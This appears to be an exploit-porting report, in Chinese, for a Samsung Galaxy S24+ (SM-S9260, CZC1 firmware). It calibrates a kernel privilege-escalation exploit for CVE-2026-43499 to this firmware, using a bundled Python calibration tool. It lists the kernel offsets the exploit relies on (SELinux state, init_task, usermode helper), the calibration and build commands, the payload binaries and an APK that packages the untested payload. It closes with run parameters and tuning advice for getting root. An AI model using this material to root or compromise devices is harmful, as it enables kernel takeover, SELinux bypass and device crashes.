# SM-S9260（港版 Galaxy S24+ / e2q）CZC1（One UI 8.0 / Android 16）内核分析报告

> 定标日期：2026-11-01
> 状态：**自动定标完成（0 未解析 / 0 BTF 不符）+ 3 处人工核对修正；载荷 104,128 B 已构建（PI 窗口取 125ms 保守值），待真机验证**（`tested=false`，gamma 一对一）
> 触发：**GitHub issue #6**——外版 `S9260ZHS5CZC1` 此前没有任何载荷，用户套用港版 CZA1 载荷，
>   6 轮 × 30 次 = **180/180 全部卡在 P0 物理页泄漏**（`pipe KernelSnitch sk_buff page leak failed`）。
> 目标：`02_exploit工程/fusion-s24u/src/targets/e2q-S9260ZHS5CZC1/`
> 素材：`/home/nt/下载/boot.img (1).lz4`（21,569,067 B，sha256 `1abb434d0127bf0a3d0c3c22fe38738844cce52fea5ad6c611834e43978b1ecc`）
>   → 解压归档为 `devices_ports/tgy_oneui8.0_czc1_boot.img`
> 模板：`e1q-S9210ZHS5CZD2`（同内核构建号 31999054、同 ZHS 地区系列的后一版固件）

---

## 0. 内核信息

| 项 | 值 |
|---|---|
| 机型 / 平台 | **SM-S9260 港版 Galaxy S24+（e2q，SM8550 "pineapple"）** |
| 系统 | One UI 8.0 / **Android 16**；安全补丁 **2026-03-05**（真机 getprop，issue #6 日志） |
| 内核版本 | `6.1.128-android14-11-31999054-abS9260ZHS5CZC1` |
| 内核构建号 | **31999054**（与 CZA1 / CZC1 / CZD2 同一构建号段） |
| 内核构建时间 | `Mar 12 04:30:18 UTC 2026` |
| 真机指纹 | `samsung/e2qzhx/e2q:16/BP2A.250605.031.A3/S9260ZHS5CZC1:user/release-keys` |
| boot 分区 | 100,663,296 B，sha256 `22454bc2a8316720f05a82eec36f0b5dd81f7afb73888b21ed147f6069960ea9` |
| boot header | v4；`KERNEL_SZ=37,022,208`、`RAMDISK_SZ=0`、`OS_PATCH_LEVEL=2026-03`、`PAGESIZE=4096`、`KERNEL_FMT=raw`、`SAMSUNG_SEANDROID` + `VBMETA` |
| raw ARM64 Image | 37,022,208 B，sha256 `e199a3a4d48717cc9a94c0f83effbd66faee3f55d503bcf3f5ec2a9d58030efc` |
| 恢复 ELF | `devices_ports/czc1_unpacked/vmlinux_czc1.elf`（41,946,294 B，**100,754 条符号**，sha256 `04dd047c…`） |
| BTF 切片 | `devices_ports/czc1_unpacked/vmlinux_czc1.btf`（5,859,386 B，magic `0xeb9f`，sha256 `299d927e…`） |

---

## 1. 为什么模板取 CZD2（而不是同为 31999054 的 CZA1）

「按内核构建定标」是三条不变规则之一，但 **构建号相同 ≠ 镜像相同**。
本次用符号表直接验证了候选模板与本镜像的关系：

| 对比 | 结果 | 结论 |
|---|---|---|
| **CZD2（S9210ZHS5CZD2，2026-04-08 构建）** | 100,754 个符号**地址 100% 相同**（仅 5 个局部标签差 ≤0x52）；BTF 切片大小一致；`remove_waiter` 反汇编**逐字节相同** | ✅ 同镜像结构，可作模板 |
| CZA1（S9280ZHS4CZA1，同为 31999054） | `nfnetlink_log` 偏 `0x0160b705`（本镜像 `0x0161b835`，差 +0x10b30）、ashmem 一簇差 ~0x10040、text 区差 ~0x800 | ❌ 不同镜像，issue #6 的 180 次失败正是此因 |

即：**这是「同构建号、同地区系列、相邻两次安全补丁」的一对镜像**（3 月 vs 4 月），
代码/数据布局除 `.rodata` 字符串区外基本冻结，所以符号项可以直接身份迁移、Δ 全为 0。

> 与 issue #6 分析报告的对应关系：报告里「载荷所属构建 CZA1 → 设备 CZC1」的错配，
> 本次由独立 target 正式解决。

---

## 2. 定标方法（自动化）

`02_exploit工程/fusion-s24u/tools/calibrate_target.py` 一条命令完成阶段 1/2：

```sh
cd 02_exploit工程/fusion-s24u
python3 tools/calibrate_target.py \
  --tag e2q-S9260ZHS5CZC1 \
  --template src/targets/e1q-S9210ZHS5CZD2 \
  --template-elf ../../devices_ports/czd2_unpacked/vmlinux_czd2.elf \
  --new-elf ../../devices_ports/czc1_unpacked/vmlinux_czc1.elf \
  --new-kernel ../../devices_ports/czc1_unpacked/kernel \
  --source-img ../../devices_ports/tgy_oneui8.0_czc1_boot.img \
  --model "SM-S9260 港版 Galaxy S24+（e2q）" --oneui "One UI 8.0" --android 16 \
  --out-dir src/targets/e2q-S9260ZHS5CZC1 \
  --work-dir work_S9260_offsets/czc1 \
  --cross-check src/targets/e3q-S9280ZHS4CZA1 src/targets/e2q-S926USQS6DZE2 src/targets/e3q-S9280ZHU6EZIF
```

流程：符号身份迁移（地址→符号名→新地址回查）→ 6 项镜像实测 → 目标内核自带 BTF 逐项核对 →
生成 `target.h` + `p0_fingerprint.h`（RMG `generate_p0_fingerprint.pl`，256 qword 自校验）→
审计 TSV + Markdown 报告。

**审计结果：迁移 20 / 派生 6 / 沿用 114（其中 47 项 BTF 实测通过）/ 未解析 0 / BTF 不符 0。**

---

## 3. 符号身份迁移（20 项，全部 Δ=0）

| 宏 | 模板 | 新值 | Δ | 符号 |
|---|---|---|---|---|
| `ANON_PIPE_BUF_OPS_OFF` | 0x0011b6bd0 | 0x0011b6bd0 | +0x0 | `anon_pipe_buf_ops` |
| `ASHMEM_COMPAT_IOCTL_OFF` | 0x000cdac50 | 0x000cdac50 | +0x0 | `compat_ashmem_ioctl` |
| `ASHMEM_FOPS_OFF` | 0x00135e7a0 | 0x00135e7a0 | +0x0 | `ashmem_fops` |
| `ASHMEM_IOCTL_OFF` | 0x000cda318 | 0x000cda318 | +0x0 | `ashmem_ioctl` |
| `ASHMEM_MMAP_OFF` | 0x000cdaca8 | 0x000cdaca8 | +0x0 | `ashmem_mmap` |
| `ASHMEM_OPEN_OFF` | 0x000cdaed4 | 0x000cdaed4 | +0x0 | `ashmem_open` |
| `ASHMEM_RELEASE_OFF` | 0x000cdaf5c | 0x000cdaf5c | +0x0 | `ashmem_release` |
| `ASHMEM_SHOW_FDINFO_OFF` | 0x000cdb07c | 0x000cdb07c | +0x0 | `ashmem_show_fdinfo` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | 0x0000d388c | 0x0000d388c | +0x0 | `call_usermodehelper_exec_work` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | 0x00046e9f0 | 0x00046e9f0 | +0x0 | `configfs_bin_write_iter` |
| `CONFIGFS_READ_ITER_OFF` | 0x00046e4c0 | 0x00046e4c0 | +0x0 | `configfs_read_iter` |
| `COPY_SPLICE_READ_OFF` | 0x0003ecac8 | 0x0003ecac8 | +0x0 | `generic_file_splice_read` |
| `INIT_TASK_OFF` | 0x00216f8c0 | 0x00216f8c0 | +0x0 | `init_task` |
| `KMALLOC_CACHES_OFF` | 0x0016d09d8 | 0x0016d09d8 | +0x0 | `kmalloc_caches` |
| `NOOP_LLSEEK_OFF` | 0x00039ed18 | 0x00039ed18 | +0x0 | `noop_llseek` |
| `ROOT_TASK_GROUP_OFF` | 0x00235cd80 | 0x00235cd80 | +0x0 | `root_task_group` |
| `SELINUX_ENFORCING_OFF` | 0x002431460 | 0x002431460 | +0x0 | `selinux_state`（`+0`，见 §5） |
| `SLIDE_LOGGERS_0_1_OFF` | 0x002162a20 | 0x002162a20 | +0x0 | `nfulnl_logger` |
| `SLIDE_SYSCTL_BOOTID_OFF` | 0x0024d35a8 | 0x0024d35a8 | +0x0 | `sysctl_bootid` |
| `SYSTEM_UNBOUND_WQ_OFF` | 0x00215ae60 | 0x00215ae60 | +0x0 | `system_unbound_wq` |

---

## 4. 镜像派生（6 项）

| 宏 | 新值 | 证据 |
|---|---|---|
| `ASHMEM_MISC_FOPS_OFF` | 0x022cfc30ULL | `ashmem_miscs+0x10`；回读 qword `0xffffffc00935e7a0` == `ashmem_fops` ✓ |
| `SLIDE_S928_PROBE_TARGET_IMAGE_OFF` | 0x022cfc30ULL | 同上 ✓ |
| `SLIDE_NFULNL_LOGGER_OFF` | **0x0161b835ULL** | `nfulnl_logger@0x2162a20.name=0xffffffc00961b835`；镜像内 `nfnetlink_log\0` 唯一命中 `0x161b835` ✓（**模板为 0x0161b7e3，差 +0x52——本 target 唯一的派生差异**） |
| `SLIDE_RANDOM_BOOT_ID_DATA_OFF` | 0x0228ab38ULL | `random_table+0x108`；回读 == `sysctl_bootid` ✓ |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | 0x000db048ULL | `worker_thread+0xa0` |
| `SLIDE_TRACEFS_EVENT_ID` | 106 | 索引 = (`__event_sched_blocked_reason` − `__start_ftrace_events`)/8 = 86；+20 → **106** |

---

## 5. 沿用模板项 / BTF 实测 / 人工核对

**沿用模板 114 项**（6.1 KMI 冻结的结构体字段与调优常量），其中 **47 项经目标内核自带 BTF 实测核对通过**。

跨 target 体检（vs CZA1 港版 / S926U1 美版 / S9280 EZIF）只报出 3 项差异，均已人工确认：

| 项 | 体检结果 | 处理 |
|---|---|---|
| `MM_STRUCT_SZ` | CZA1=0x3c0，本 target=0x400 | **保留 0x400**：BTF 实测 `sizeof(mm_struct)=0x3c0`，但该宏是 KernelSnitch 的 bruteforce 步长/分母，**不是结构体大小**；2026-10-25 真机结论是 0x3c0 在 6.1.128 上 100% 泄漏失败 |
| `SLIDE_WAIT_NSEC` | 模板 CZD2=300ms；EZIF=125ms | **2026-11-01 改为 125ms**（不随模板）：EZIF 真机二分证明 300ms 会 panic、125ms 一次成功；失败模式下「窗口过短只 triggered=0」而「过长会 panic 重启」，未实测机型首发取偏短值。见 §8 |
| `APP_FOPS_FRESH_PAGE_ATTEMPTS` | CZA1 / S926U1 未定义（代码默认值） | 保留 5（同模板） |

**人工核对 3 处**（写入 `target.h` 注释）：

1. `BUILD_FINGERPRINT`：校准器按 `e3qoxm/e3q:16/CP2A.XXXXXXXX.XXX` 生成占位值，已替换为 **issue #6 真机日志里的实际指纹**（`samsung/e2qzhx/e2q:16/BP2A.250605.031.A3/…`）。该宏不参与利用逻辑，仅作标识。
2. `P0_FINGERPRINT_HEADER`：模板残留 `targets/e1q-S9210ZCU4BYH7/p0_fingerprint.h`，已改为 `targets/e2q-S9260ZHS5CZC1/p0_fingerprint.h`。
3. `SELINUX_ENFORCING_OFF` 注释：本值由符号迁移从 CZD2 继承（`selinux_state+0`），CZD2 那边 2026-10-26 已按 BTF 人工修正过 `+1` 的旧错；注释改为如实描述，避免误读成本次修正。

---

## 6. 漏洞路径确认（CVE-2026-43499 在不在）

`remove_waiter`（`0xffffffc0090bcafc`，0x268 B）反汇编：CZC1 与 CZD2 **逐字节相同**，且含上游补丁所修的
错误路径——

```asm
d5384114  mrs  x20, SP_EL0          ; x20 = current
91249296  add  x22, x20, #0x924     ; &current->pi_lock
...
f904aa9f  str  xzr, [x20, #0x950]   ; 清的是 current->pi_blocked_on，而非 waiter->task->pi_blocked_on
```

即：**该内核仍走「用 current 代替 waiter->task」的错误分支**，rtmutex PI 簇偏移
`pi_lock=0x924` / `pi_blocked_on=0x950` 与 CZD2 一致（与 target.h 的 `FAKE_TASK_PI_LOCK_OFF` /
`FAKE_TASK_PI_BLOCKED_ON_OFF` 相符）。利用链结构与已验证的 6.1.128 目标同源。

---

## 7. 构建验证

```sh
cd 02_exploit工程/fusion-s24u
ANDROID_NDK_HOME=/home/nt/项目/samsung_root_research/06_工具链/android-ndk-r29 \
  make TARGET=e2q-S9260ZHS5CZC1 stable all
```

| 产物 | 大小 | sha256 |
|---|---|---|
| `cve-2026-43499-app.stable.so`（App 载荷） | **104,128 B**（上限恰好） | `e14d2b89ca54b2c18a85c0ea05816ea38dfd50dde0e820f45610f58fe59a7f13` |
| `cve-2026-43499-app.so` | 127,808 B | `dd4e183374284c6388f150872a4a0a7ec7f40e316ad4b795e2ee95e8cdfccb1c` |
| `cve-2026-43499`（preload） | 97,176 B | `13c3b0e0d15ba0117b51e3d5e8f18cfc85e31556c6e4c01130d7bafec86e7cc5` |
| `cve-2026-43499-root`（守护进程） | 27,496 B | `d2dccd05d027fde632301613e65337274ef72f395173d6ffb48ceef50babba19` |

- 内嵌标识 `e2q-S9260ZHS5CZC1-app-physical-p0-oracle` ✓
- **P0 指纹 32 行 × 8 qword 全部内嵌可检出 32/32**；末行（slide=0x1f0000）首词 = `0x1474694dfa405a4d`（MZ 头，自校验通过）
- 重编译**逐字节可复现**（同 sha256）
- 与同族载荷对比：vs `e1q-S9210ZHS5CZD2` 仅 **4.52%** 字节不同（2 个指纹 qword + `nfnetlink_log` + 标签串 + PI 窗口常量）；vs `e3q-S9280ZHU6EZIF` / `e3q-S928BXXU6EZIF` 42~45%（不同构建）
- 125ms 改动已验证进包：反汇编对比 300ms 版仅 8 条指令不同（`movk w9,#0x11e1` → `#0x773`，即 300,000,000 → 125,000,000；配套 ms/ns 分解常量同步变化），二进制层面 15 B 差异
- `target.h` sha256 `e545e95c0c7f63ea3b51b06d003904e5a7f9a12277978c0876957ec6b36b6a09`；
  `p0_fingerprint.h` sha256 `ac415b2aff562f786c77004bb6cafaa849d730d35853139d16c8dc83ce483559`
- P0 指纹 vs CZD2：256 qword 中仅 **2 个** 不同（slide `0x110000` 第 4 词、`0x190000` 第 6 词）

**App gamma 一对一包（2026-11-01 构建）**：`RootMyS24-v3.5.4-gamma.233-czc1.apk`
（6,199,127 B，sha256 `350ed873bd1f0ccd622a5f75e53a2918159433794bcae2754dc43d644e6f4eb5`；
versionCode 233 / versionName `3.5.4-gamma.233`；官方签名证书 SHA-256 `12daafaa…` 与既有发布包一致）。
`PACKAGED_ENTRIES=S9260CZC1`、`SERIES=GAMMA`（未测试载荷开关默认打开），包内
`assets/cve-2026-43499-S9260ZHS5CZC1` 与上表 stable 载荷**逐字节一致**，另含 `ksud-selected`。
App 侧提交 RootMyS9280 `dcc2a4e`（仓库内 `app/src/gamma/assets/`）。

---

## 8. 待真机验证清单（含风险提示）

- [ ] 推送四件套后按指南 §3.2 以 shell 域 `LD_PRELOAD` 运行（`EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120`）
- [ ] 重点看阶段地图：`slide-kaslr-ok` → `fresh physrw pipe page` → `mm leaked=…` → `root umh result socket=1`
- [ ] **PI-futex 窗口**：本 target 首发取 `SLIDE_WAIT_NSEC=125ms` + `APP_FOPS_FRESH_PAGE_ATTEMPTS=5`
  （模板 CZD2 是 300ms；**2026-10-31 在 S9280 EZIF（6.1.162）上 300ms 会直接 panic 重启**——
  窗口过长 → CFI 写落到只读页 → `FSC=0x0e permission fault`，而 125ms 一次拿到 root）。
  建议：低负载窗口、熄屏、每次只跑 1 次（App 已内置 `EXPLOIT_ATTEMPTS=1`）；
  若长期 `triggered=0`，再二分上调（150ms / 200ms），不要直接跳 300ms。
- [ ] 若 `pipe KernelSnitch sk_buff page leak failed` 持续出现，说明本 target 的 P0 定标仍不匹配，回传日志
- [ ] 采集 `getprop ro.build.fingerprint` 复核（本 target 已填真机值）；`cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id` 应为 106
- [ ] 通过后把 App 条目置为 `tested = true`，并把该 target 回馈 Root-My-Galaxy-Payloads

---

## 9. 产物索引

| 文件 | 说明 |
|---|---|
| `devices_ports/tgy_oneui8.0_czc1_boot.img` | 原始 boot（100,663,296 B，gitignore） |
| `devices_ports/czc1_boot.img.lz4` | 下载原件备份（21,569,067 B，gitignore） |
| `devices_ports/czc1_unpacked/kernel` | 解出的 raw ARM64 Image（37,022,208 B，gitignore） |
| `devices_ports/czc1_unpacked/vmlinux_czc1.elf` | 恢复的带符号 ELF（100,754 符号，gitignore） |
| `devices_ports/czc1_unpacked/vmlinux_czc1.btf` | 内核自带 BTF（结构体实测素材，已入 git） |
| `02_exploit工程/fusion-s24u/src/targets/e2q-S9260ZHS5CZC1/` | 正式 target（`target.h` + `p0_fingerprint.h`，可直接 `make`） |
| `02_exploit工程/fusion-s24u/work_S9260_offsets/czc1/` | 定标报告 + 审计 TSV + 双 ELF nm 符号表 |

---

## 10. 对 issue #6 的意义

- 该构建（`S9260ZHS5CZC1`，外版 31999054）**现在有独立载荷了**；此前只能套 CZA1，
  必然 180/180 卡在 P0 泄漏。
- 载荷按「外版」分支即可服务同构建的其它外版机器（同镜像布局者），但**跨机型同构建号仍要先比符号**：
  本次证明 CZD2（e1q）与 CZC1（e2q）**符号 100% 同址**，而 CZA1（e3q，同为 31999054）**不同址**。
  所以「同构建号能互串」只在**镜像确实相同**时成立——判定方法是比 `llvm-nm` 符号地址，而不是看构建号。
